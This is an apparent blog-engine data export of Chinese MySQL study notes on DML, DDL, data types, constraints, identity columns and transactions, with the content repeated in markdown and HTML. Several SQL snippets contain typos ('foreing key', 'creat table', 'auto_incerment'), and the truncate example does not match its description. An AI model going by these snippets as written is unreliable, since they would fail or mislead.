要求在从表中设置外键关系\n2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求\n3. 主表的关联列必须是一个key（一般是主键或唯一）\n4. 插入数据时，先插入主表，再插入从表，删除时相反\n# 添加外键约束：\nalter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);\n```\n\n7. 修改表时添加约束：\n\n```\n1. 添加列级约束：\nalter table 表名 modify column 字段名 字段类型 新约束\n2. 添加表级约束：\nalter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】\n```\n\n8. 修改表时删除约束：\n\n![NBXJgK.png](https://s1.ax1x.com/2020/06/25/NBXJgK.png)\n\n\n\n###  标识列\n\n1. 又称为自增长列，可以不用手动的插入值，系统提供默认的序列值\n2. 特点：\n\n```\n1. 标识列不一定要和主键搭配，但必须要和一个key搭配\n2. 一个表至多只有一个标识列\n3. 标识列的类型只能是数值型\n4.标识列可以通过 set auto_increment_incremennt= ;设置步长\n\t可以通过手动插入值，设置起始值\n```\n\n3. 修改表时设置标识列\n\n```\nalter table 表名 modify column 字段值 类型 key名 auto_incerment;\n```\n\n4. 修改表时删除标识列\n\n```\nalter table 表名 modify column 字段值 类型；\n```\n\n\n\n## TCL语言\n\n1. 事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程\n\n2. 事务的特性\n\n![NBXYjO.png](https://s1.ax1x.com/2020/06/25/NBXYjO.png)\n\n3. 事务的创建\n\n![NBX89x.png](https://s1.ax1x.com/2020/06/25/NBX89x.png)\n\n![NBXNuD.png](https://s1.ax1x.com/2020/06/25/NBXNuD.png)\n\n- 实例\n\n![NBXG36.png](https://s1.ax1x.com/2020/06/25/NBXG36.png)\n\n\n\n5. 事务隔离级别\n\n![image-20200626215014414](/home/blacksheep/图片/笔记/数据库/image-20200626215014414.png)\n\n![image-20200627183401294](/home/blacksheep/图片/笔记/数据库/image-20200627183401294.png)\n\n\n\n- MySQL中默认隔离级别 repeatable read\n- oracle中默认级别 read committed\n- 查看隔离级别 ：select @@tx_isolation;\n- 设置隔离级别 ：\n\n```\nset session 或 global transaction isolation level 隔离级别；\n```\n\n\n\n6. savepoint 节点名，设置保存点\n\n```\n# 演示savepoint的使用\nset autocommit = 0;\nstart transaction;\ndelete from account where id=25;\nsavepoint a;  #设置保存点\ndelete from account where id=28;\nrollback to a;  #回滚到保存点\n\nselect * from account;\n\n结果：id=28还在，id=25没有\n```\n\n\n\n\n\n","slug":"数据库(二)","published":1,"date":"2021-03-24T04:15:03.014Z","updated":"2021-03-24T04:15:03.059Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl42o0016dsvtb56w83nw","content":"<h1 id=\"数据库（二）\"><a href=\"#数据库（二）\" class=\"headerlink\" title=\"数据库（二）\"></a>数据库（二）</h1><p><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=105\">参考的相关视频资料连接</a></p>\n<h2 id=\"DML语言\"><a href=\"#DML语言\" class=\"headerlink\" title=\"DML语言\"></a>DML语言</h2><ul>\n<li>数据操作语言：<ul>\n<li>插入：insert</li>\n<li>修改：update</li>\n<li>删除：delete</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"插入语句\"><a href=\"#插入语句\" class=\"headerlink\" title=\"插入语句\"></a>插入语句</h3><h4 id=\"方式一：经典插入语句\"><a href=\"#方式一：经典插入语句\" class=\"headerlink\" title=\"方式一：经典插入语句\"></a>方式一：经典插入语句</h4><span id=\"more\"></span>\n\n<ul>\n<li>语法</li>\n</ul>\n<pre><code>insert into 表名（列名1, 列名2, ...）\nvalues （值1, 值2, ...）;</code></pre><ul>\n<li>注意事项：<ol>\n<li>插入的值的类型与列的类型一致或兼容</li>\n<li>可以为NULL的列可以插入NULL值，不为NULL的列必须插入值</li>\n<li>列的顺序可以调换，但是插入的值必须和列相匹配</li>\n<li>列数和值得个数必须相一致</li>\n<li>可以省略列名，默认所有列，而且列的顺序和表中的顺序一致</li>\n</ol>\n</li>\n</ul>\n<pre><code>insert into beauty\nvalues(列1, 列2, ...);            //省略列名，默认所有列</code></pre><h4 id=\"方式二：\"><a href=\"#方式二：\" class=\"headerlink\" title=\"方式二：\"></a>方式二：</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>insert into 表名\nset 列名1=值1，列名2=值2，...</code></pre><ol start=\"2\">\n<li>案例:</li>\n</ol>\n<pre><code>insert into beauty\nset id=19, name=&#39;章子怡&#39;，phone=&#39;110&#39;;</code></pre><h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h4><ol>\n<li>方式一支持插入多行，方式二不行</li>\n<li>方式一支持子查询，方式二不行</li>\n</ol>\n<h3 id=\"修改语句\"><a href=\"#修改语句\" class=\"headerlink\" title=\"修改语句\"></a>修改语句</h3><h4 id=\"修改单表的记录（-重点）\"><a href=\"#修改单表的记录（-重点）\" class=\"headerlink\" title=\"修改单表的记录（*重点）\"></a>修改单表的记录（*重点）</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>update 表名\nset 列=新值，列=新值，...\nwhere 筛选条件；</code></pre><ol start=\"2\">\n<li>案例：修改boys表中id号位2的名称为张飞，魅力值10</li>\n</ol>\n<pre><code>update boys set boyname=&#39;张飞&#39;， usercp=10\nwhere id=2;</code></pre><h4 id=\"修改多表得记录-了解即可\"><a href=\"#修改多表得记录-了解即可\" class=\"headerlink\" title=\"修改多表得记录(了解即可)\"></a>修改多表得记录(了解即可)</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>sql92语法：\nupdate 表1 别名， 表2 别名\nset 列=值，...\nwhere 连接条件\nand 筛选条件\n\nsql99语法：\nupdate 表1 别名\ninner 连接类型 join 表2 别名\non 链接条件\nset 列=值，...</code></pre><h3 id=\"删除语句\"><a href=\"#删除语句\" class=\"headerlink\" title=\"删除语句\"></a>删除语句</h3><ol>\n<li>方式一：delete </li>\n</ol>\n<ul>\n<li>删除整行</li>\n<li>单表的删除</li>\n</ul>\n<pre><code>语法：\ndelete from 表名 where 筛选条件</code></pre><ul>\n<li>案例：删除手机号以3结尾的女孩信息</li>\n</ul>\n<pre><code>delete from girls \nwhere phon like &#39;%3&#39;;</code></pre><ol start=\"2\">\n<li>方式二：truncate</li>\n</ol>\n<pre><code>语法：\ntruncate table 表名</code></pre><ul>\n<li>案例：将魅力值&gt;100的男神信息删除</li>\n</ul>\n<pre><code>truncate table boys;</code></pre><h2 id=\"DDL语言\"><a href=\"#DDL语言\" class=\"headerlink\" title=\"DDL语言\"></a>DDL语言</h2><ol>\n<li>DDL数据定义语言</li>\n<li>表和库的管理</li>\n</ol>\n<h3 id=\"库的操作\"><a href=\"#库的操作\" class=\"headerlink\" title=\"库的操作\"></a>库的操作</h3><ol>\n<li>库的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>create database (if not exists)库名；</code></pre><ol start=\"2\">\n<li>库的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>drop database if exists 库名；</code></pre><h3 id=\"表的管理\"><a href=\"#表的管理\" class=\"headerlink\" title=\"表的管理\"></a>表的管理</h3><ol>\n<li>表的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>create  table 表名(\n    列名 列的类型【(长度) (约束)】，  //长度和约束可选\n    列名 列的类型【(长度) (约束)】，\n    ...\n)；</code></pre><ul>\n<li>案例：创建表Book</li>\n</ul>\n<pre><code>creat table book(\n    id int, #编号\n    bname varchar (20),  #图书名\n    authorid int,  #作者编号\n    publishdate datetime;  #出版日期\n)；</code></pre><ol start=\"2\">\n<li>表的修改</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>alter table 表名 关键字 column 列名 列类型 约束</code></pre><ul>\n<li>修改列名</li>\n</ul>\n<pre><code>//参考上个案例，创建表book\nalter table book change aolumn publish pubdate datetime;</code></pre><ul>\n<li>修改列的类型或约束</li>\n</ul>\n<pre><code>alter table book modify column pubtade timestamp;</code></pre><ul>\n<li>添加新列</li>\n</ul>\n<pre><code>alter table author add column annual double;</code></pre><ul>\n<li>删除列</li>\n</ul>\n<pre><code>alter table author drop column annual;</code></pre><ul>\n<li>修改表名</li>\n</ul>\n<pre><code>alter table  author rename to book_author;</code></pre><ol start=\"3\">\n<li>表的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>drop table if exists book_author;</code></pre><ul>\n<li>通用的写法：</li>\n</ul>\n<pre><code>drop database if exists 旧库名；\ncreate database 新库名；\n\ndrop table if exists 旧表名；\ncreate table 表名（）；</code></pre><ol start=\"4\">\n<li>表的复制</li>\n</ol>\n<ul>\n<li>复制表的结构</li>\n</ul>\n<pre><code>create table copy like author;</code></pre><ul>\n<li>复制表的结构+数据</li>\n</ul>\n<pre><code>create table copy2\nselect * from author;</code></pre><ul>\n<li>只复制部分数据</li>\n</ul>\n<pre><code>create table copy3\nselect id, au_name\nfrom autor\nwhere nation=&#39;中国&#39;；</code></pre><ul>\n<li>复制部分结构</li>\n</ul>\n<pre><code>create table copy4\nselect id, au_name\nfrom author\nwhere 0;</code></pre><h3 id=\"常见的数据类型\"><a href=\"#常见的数据类型\" class=\"headerlink\" title=\"常见的数据类型\"></a>常见的数据类型</h3><pre><code>数值型：\n        整型\n        小数：\n            定点型\n            浮点型\n字符型：\n        较短的文本：char、varchar\n        较长的文本：text，blob（较长的二进制数据）\n日期型</code></pre><h4 id=\"整型\"><a href=\"#整型\" class=\"headerlink\" title=\"整型\"></a>整型</h4><ol>\n<li>分类：tinyint, smallint, mediumint, int\\integer, bigint</li>\n<li>特点：</li>\n</ol>\n<ul>\n<li>如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字</li>\n<li>如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值</li>\n</ul>\n<h4 id=\"小数\"><a href=\"#小数\" class=\"headerlink\" title=\"小数\"></a>小数</h4><ol>\n<li>分类：</li>\n</ol>\n<ul>\n<li>浮点型： float(M, D) , double(M, D)</li>\n<li>定点型：dec(M, D) , decimal(M, D)</li>\n</ul>\n<ol start=\"2\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>M：整数部位+加小数部位的总长度</li>\n<li>D：小数部位长度</li>\n<li>如果超过范围，则插入临界值</li>\n<li>M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定</li>\n<li>定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型</li>\n</ul>\n<h4 id=\"字符型\"><a href=\"#字符型\" class=\"headerlink\" title=\"字符型\"></a>字符型</h4><p>较短的文本：char、varchar<br>较长的文本：text，blob（较长的二进制数据）</p>\n<ol>\n<li>特点：</li>\n</ol>\n<pre><code>          写法        M的意思                      特点        空间的耗费    效率  \nchar     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高\nvarchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低</code></pre><h4 id=\"日期型\"><a href=\"#日期型\" class=\"headerlink\" title=\"日期型\"></a>日期型</h4><ol>\n<li><p>分类：date 只保存日期</p>\n<p>​            time 只保存时间</p>\n<p>​            year 只保存年</p>\n<p>​            datetime 保存日期+时间</p>\n<p>​            timestamp 保存日期+时间</p>\n</li>\n<li><p>特点：</p>\n</li>\n</ol>\n<pre><code>            字节   范围          时区等的影响\ndatetime     8    1000-9999         不受\ntimestamp    4    1970-2038          受</code></pre><h3 id=\"常见约束\"><a href=\"#常见约束\" class=\"headerlink\" title=\"常见约束\"></a>常见约束</h3><ol>\n<li><p>含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性</p>\n</li>\n<li><p>分类：</p>\n</li>\n</ol>\n<pre><code>1. not null: 非空用于保证该字段值不能为空\n2. default： 默认，用于赋予该字段默认值\n3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空\n4. unique：用于保证该字段的值的唯一性\n5. check：检查约束【MySQL中不支持】 \n6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值</code></pre><ol start=\"3\">\n<li>添加约束的时机：</li>\n</ol>\n<pre><code>1. 创建表时\n2. 修改表时</code></pre><ol start=\"4\">\n<li>约束的添加分类：</li>\n</ol>\n<pre><code>1. 列级约束：\n    直接在字段名和类型后面追加约束类型即可\n    六大约束语法上都支持，但外键约束没有效果\n2. 表级约束：\n    在所有字段的最下面：constraint 约束名 约束类型（字段名）\n    除了非空、默认约束，其他都支持</code></pre><ol start=\"5\">\n<li>主键与唯一：</li>\n</ol>\n<pre><code>        保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合\n主键        Y                N            一个                允许，不推荐\n唯一        Y                Y            多个                 允许，不推荐</code></pre><ol start=\"6\">\n<li>外键约束</li>\n</ol>\n<pre><code>1. 要求在从表中设置外键关系\n2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求\n3. 主表的关联列必须是一个key（一般是主键或唯一）\n4. 插入数据时，先插入主表，再插入从表，删除时相反\n# 添加外键约束：\nalter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);</code></pre><ol start=\"7\">\n<li>修改表时添加约束：</li>\n</ol>\n<pre><code>1. 添加列级约束：\nalter table 表名 modify column 字段名 字段类型 新约束\n2. 添加表级约束：\nalter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】</code></pre><ol start=\"8\">\n<li>修改表时删除约束：</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXJgK.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXJgK.png\"></p>\n<h3 id=\"标识列\"><a href=\"#标识列\" class=\"headerlink\" title=\"标识列\"></a>标识列</h3><ol>\n<li>又称为自增长列，可以不用手动的插入值，系统提供默认的序列值</li>\n<li>特点：</li>\n</ol>\n<pre><code>1. 标识列不一定要和主键搭配，但必须要和一个key搭配\n2. 一个表至多只有一个标识列\n3. 标识列的类型只能是数值型\n4.标识列可以通过 set auto_increment_incremennt= ;设置步长\n    可以通过手动插入值，设置起始值</code></pre><ol start=\"3\">\n<li>修改表时设置标识列</li>\n</ol>\n<pre><code>alter table 表名 modify column 字段值 类型 key名 auto_incerment;</code></pre><ol start=\"4\">\n<li>修改表时删除标识列</li>\n</ol>\n<pre><code>alter table 表名 modify column 字段值 类型；</code></pre><h2 id=\"TCL语言\"><a href=\"#TCL语言\" class=\"headerlink\" title=\"TCL语言\"></a>TCL语言</h2><ol>\n<li><p>事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程</p>\n</li>\n<li><p>事务的特性</p>\n</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXYjO.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXYjO.png\"></p>\n<ol start=\"3\">\n<li>事务的创建</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBX89x.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBX89x.png\"></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXNuD.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXNuD.png\"></p>\n<ul>\n<li>实例</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXG36.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXG36.png\"></p>\n<ol start=\"5\">\n<li>事务隔离级别</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"/home/blacksheep/%E5%9B%BE%E7%89%87/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200626215014414.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20200626215014414\"></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"/home/blacksheep/%E5%9B%BE%E7%89%87/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200627183401294.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20200627183401294\"></p>\n<ul>\n<li>MySQL中默认隔离级别 repeatable read</li>\n<li>oracle中默认级别 read committed</li>\n<li>查看隔离级别 ：select @@tx_isolation;</li>\n<li>设置隔离级别 ：</li>\n</ul>\n<pre><code>set session 或 global transaction isolation level 隔离级别；</code></pre><ol start=\"6\">\n<li>savepoint 节点名，设置保存点</li>\n</ol>\n<pre><code># 演示savepoint的使用\nset autocommit = 0;\nstart transaction;\ndelete from account where id=25;\nsavepoint a;  #设置保存点\ndelete from account where id=28;\nrollback to a;  #回滚到保存点\n\nselect * from account;\n\n结果：id=28还在，id=25没有</code></pre>","site":{"data":{}},"excerpt":"<h1 id=\"数据库（二）\"><a href=\"#数据库（二）\" class=\"headerlink\" title=\"数据库（二）\"></a>数据库（二）</h1><p><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=105\">参考的相关视频资料连接</a></p>\n<h2 id=\"DML语言\"><a href=\"#DML语言\" class=\"headerlink\" title=\"DML语言\"></a>DML语言</h2><ul>\n<li>数据操作语言：<ul>\n<li>插入：insert</li>\n<li>修改：update</li>\n<li>删除：delete</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"插入语句\"><a href=\"#插入语句\" class=\"headerlink\" title=\"插入语句\"></a>插入语句</h3><h4 id=\"方式一：经典插入语句\"><a href=\"#方式一：经典插入语句\" class=\"headerlink\" title=\"方式一：经典插入语句\"></a>方式一：经典插入语句</h4>","more":"<ul>\n<li>语法</li>\n</ul>\n<pre><code>insert into 表名（列名1, 列名2, ...）\nvalues （值1, 值2, ...）;</code></pre><ul>\n<li>注意事项：<ol>\n<li>插入的值的类型与列的类型一致或兼容</li>\n<li>可以为NULL的列可以插入NULL值，不为NULL的列必须插入值</li>\n<li>列的顺序可以调换，但是插入的值必须和列相匹配</li>\n<li>列数和值得个数必须相一致</li>\n<li>可以省略列名，默认所有列，而且列的顺序和表中的顺序一致</li>\n</ol>\n</li>\n</ul>\n<pre><code>insert into beauty\nvalues(列1, 列2, ...);            //省略列名，默认所有列</code></pre><h4 id=\"方式二：\"><a href=\"#方式二：\" class=\"headerlink\" title=\"方式二：\"></a>方式二：</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>insert into 表名\nset 列名1=值1，列名2=值2，...</code></pre><ol start=\"2\">\n<li>案例:</li>\n</ol>\n<pre><code>insert into beauty\nset id=19, name=&#39;章子怡&#39;，phone=&#39;110&#39;;</code></pre><h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h4><ol>\n<li>方式一支持插入多行，方式二不行</li>\n<li>方式一支持子查询，方式二不行</li>\n</ol>\n<h3 id=\"修改语句\"><a href=\"#修改语句\" class=\"headerlink\" title=\"修改语句\"></a>修改语句</h3><h4 id=\"修改单表的记录（-重点）\"><a href=\"#修改单表的记录（-重点）\" class=\"headerlink\" title=\"修改单表的记录（*重点）\"></a>修改单表的记录（*重点）</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>update 表名\nset 列=新值，列=新值，...\nwhere 筛选条件；</code></pre><ol start=\"2\">\n<li>案例：修改boys表中id号位2的名称为张飞，魅力值10</li>\n</ol>\n<pre><code>update boys set boyname=&#39;张飞&#39;， usercp=10\nwhere id=2;</code></pre><h4 id=\"修改多表得记录-了解即可\"><a href=\"#修改多表得记录-了解即可\" class=\"headerlink\" title=\"修改多表得记录(了解即可)\"></a>修改多表得记录(了解即可)</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>sql92语法：\nupdate 表1 别名， 表2 别名\nset 列=值，...\nwhere 连接条件\nand 筛选条件\n\nsql99语法：\nupdate 表1 别名\ninner 连接类型 join 表2 别名\non 链接条件\nset 列=值，...</code></pre><h3 id=\"删除语句\"><a href=\"#删除语句\" class=\"headerlink\" title=\"删除语句\"></a>删除语句</h3><ol>\n<li>方式一：delete </li>\n</ol>\n<ul>\n<li>删除整行</li>\n<li>单表的删除</li>\n</ul>\n<pre><code>语法：\ndelete from 表名 where 筛选条件</code></pre><ul>\n<li>案例：删除手机号以3结尾的女孩信息</li>\n</ul>\n<pre><code>delete from girls \nwhere phon like &#39;%3&#39;;</code></pre><ol start=\"2\">\n<li>方式二：truncate</li>\n</ol>\n<pre><code>语法：\ntruncate table 表名</code></pre><ul>\n<li>案例：将魅力值&gt;100的男神信息删除</li>\n</ul>\n<pre><code>truncate table boys;</code></pre><h2 id=\"DDL语言\"><a href=\"#DDL语言\" class=\"headerlink\" title=\"DDL语言\"></a>DDL语言</h2><ol>\n<li>DDL数据定义语言</li>\n<li>表和库的管理</li>\n</ol>\n<h3 id=\"库的操作\"><a href=\"#库的操作\" class=\"headerlink\" title=\"库的操作\"></a>库的操作</h3><ol>\n<li>库的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>create database (if not exists)库名；</code></pre><ol start=\"2\">\n<li>库的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>drop database if exists 库名；</code></pre><h3 id=\"表的管理\"><a href=\"#表的管理\" class=\"headerlink\" title=\"表的管理\"></a>表的管理</h3><ol>\n<li>表的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>create  table 表名(\n    列名 列的类型【(长度) (约束)】，  //长度和约束可选\n    列名 列的类型【(长度) (约束)】，\n    ...\n)；</code></pre><ul>\n<li>案例：创建表Book</li>\n</ul>\n<pre><code>creat table book(\n    id int, #编号\n    bname varchar (20),  #图书名\n    authorid int,  #作者编号\n    publishdate datetime;  #出版日期\n)；</code></pre><ol start=\"2\">\n<li>表的修改</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>alter table 表名 关键字 column 列名 列类型 约束</code></pre><ul>\n<li>修改列名</li>\n</ul>\n<pre><code>//参考上个案例，创建表book\nalter table book change aolumn publish pubdate datetime;</code></pre><ul>\n<li>修改列的类型或约束</li>\n</ul>\n<pre><code>alter table book modify column pubtade timestamp;</code></pre><ul>\n<li>添加新列</li>\n</ul>\n<pre><code>alter table author add column annual double;</code></pre><ul>\n<li>删除列</li>\n</ul>\n<pre><code>alter table author drop column annual;</code></pre><ul>\n<li>修改表名</li>\n</ul>\n<pre><code>alter table  author rename to book_author;</code></pre><ol start=\"3\">\n<li>表的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<pre><code>drop table if exists book_author;</code></pre><ul>\n<li>通用的写法：</li>\n</ul>\n<pre><code>drop database if exists 旧库名；\ncreate database 新库名；\n\ndrop table if exists 旧表名；\ncreate table 表名（）；</code></pre><ol start=\"4\">\n<li>表的复制</li>\n</ol>\n<ul>\n<li>复制表的结构</li>\n</ul>\n<pre><code>create table copy like author;</code></pre><ul>\n<li>复制表的结构+数据</li>\n</ul>\n<pre><code>create table copy2\nselect * from author;</code></pre><ul>\n<li>只复制部分数据</li>\n</ul>\n<pre><code>create table copy3\nselect id, au_name\nfrom autor\nwhere nation=&#39;中国&#39;；</code></pre><ul>\n<li>复制部分结构</li>\n</ul>\n<pre><code>create table copy4\nselect id, au_name\nfrom author\nwhere 0;</code></pre><h3 id=\"常见的数据类型\"><a href=\"#常见的数据类型\" class=\"headerlink\" title=\"常见的数据类型\"></a>常见的数据类型</h3><pre><code>数值型：\n        整型\n        小数：\n            定点型\n            浮点型\n字符型：\n        较短的文本：char、varchar\n        较长的文本：text，blob（较长的二进制数据）\n日期型</code></pre><h4 id=\"整型\"><a href=\"#整型\" class=\"headerlink\" title=\"整型\"></a>整型</h4><ol>\n<li>分类：tinyint, smallint, mediumint, int\\integer, bigint</li>\n<li>特点：</li>\n</ol>\n<ul>\n<li>如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字</li>\n<li>如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值</li>\n</ul>\n<h4 id=\"小数\"><a href=\"#小数\" class=\"headerlink\" title=\"小数\"></a>小数</h4><ol>\n<li>分类：</li>\n</ol>\n<ul>\n<li>浮点型： float(M, D) , double(M, D)</li>\n<li>定点型：dec(M, D) , decimal(M, D)</li>\n</ul>\n<ol start=\"2\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>M：整数部位+加小数部位的总长度</li>\n<li>D：小数部位长度</li>\n<li>如果超过范围，则插入临界值</li>\n<li>M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定</li>\n<li>定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型</li>\n</ul>\n<h4 id=\"字符型\"><a href=\"#字符型\" class=\"headerlink\" title=\"字符型\"></a>字符型</h4><p>较短的文本：char、varchar<br>较长的文本：text，blob（较长的二进制数据）</p>\n<ol>\n<li>特点：</li>\n</ol>\n<pre><code>          写法        M的意思                      特点        空间的耗费    效率  \nchar     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高\nvarchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低</code></pre><h4 id=\"日期型\"><a href=\"#日期型\" class=\"headerlink\" title=\"日期型\"></a>日期型</h4><ol>\n<li><p>分类：date 只保存日期</p>\n<p>​            time 只保存时间</p>\n<p>​            year 只保存年</p>\n<p>​            datetime 保存日期+时间</p>\n<p>​            timestamp 保存日期+时间</p>\n</li>\n<li><p>特点：</p>\n</li>\n</ol>\n<pre><code>            字节   范围          时区等的影响\ndatetime     8    1000-9999         不受\ntimestamp    4    1970-2038          受</code></pre><h3 id=\"常见约束\"><a href=\"#常见约束\" class=\"headerlink\" title=\"常见约束\"></a>常见约束</h3><ol>\n<li><p>含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性</p>\n</li>\n<li><p>分类：</p>\n</li>\n</ol>\n<pre><code>1. not null: 非空用于保证该字段值不能为空\n2. default： 默认，用于赋予该字段默认值\n3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空\n4. unique：用于保证该字段的值的唯一性\n5. check：检查约束【MySQL中不支持】 \n6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值</code></pre><ol start=\"3\">\n<li>添加约束的时机：</li>\n</ol>\n<pre><code>1. 创建表时\n2. 修改表时</code></pre><ol start=\"4\">\n<li>约束的添加分类：</li>\n</ol>\n<pre><code>1. 列级约束：\n    直接在字段名和类型后面追加约束类型即可\n    六大约束语法上都支持，但外键约束没有效果\n2. 表级约束：\n    在所有字段的最下面：constraint 约束名 约束类型（字段名）\n    除了非空、默认约束，其他都支持</code></pre><ol start=\"5\">\n<li>主键与唯一：</li>\n</ol>\n<pre><code>        保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合\n主键        Y                N            一个                允许，不推荐\n唯一        Y                Y            多个                 允许，不推荐</code></pre><ol start=\"6\">\n<li>外键约束</li>\n</ol>\n<pre><code>1. 要求在从表中设置外键关系\n2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求\n3. 主表的关联列必须是一个key（一般是主键或唯一）\n4. 插入数据时，先插入主表，再插入从表，删除时相反\n# 添加外键约束：\nalter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);</code></pre><ol start=\"7\">\n<li>修改表时添加约束：</li>\n</ol>\n<pre><code>1. 添加列级约束：\nalter table 表名 modify column 字段名 字段类型 新约束\n2. 添加表级约束：\nalter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】</code></pre><ol start=\"8\">\n<li>修改表时删除约束：</li>\n</ol>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXJgK.png\" alt=\"NBXJgK.png\"></p>\n<h3 id=\"标识列\"><a href=\"#标识列\" class=\"headerlink\" title=\"标识列\"></a>标识列</h3><ol>\n<li>又称为自增长列，可以不用手动的插入值，系统提供默认的序列值</li>\n<li>特点：</li>\n</ol>\n<pre><code>1. 标识列不一定要和主键搭配，但必须要和一个key搭配\n2. 一个表至多只有一个标识列\n3. 标识列的类型只能是数值型\n4.标识列可以通过 set auto_increment_incremennt= ;设置步长\n    可以通过手动插入值，设置起始值</code></pre><ol start=\"3\">\n<li>修改表时设置标识列</li>\n</ol>\n<pre><code>alter table 表名 modify column 字段值 类型 key名 auto_incerment;</code></pre><ol start=\"4\">\n<li>修改表时删除标识列</li>\n</ol>\n<pre><code>alter table 表名 modify column 字段值 类型；</code></pre><h2 id=\"TCL语言\"><a href=\"#TCL语言\" class=\"headerlink\" title=\"TCL语言\"></a>TCL语言</h2><ol>\n<li><p>事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程</p>\n</li>\n<li><p>事务的特性</p>\n</li>\n</ol>\n<p><img src=\"https://s1.ax1x.com/2020/06/25/NBXYjO.png\" 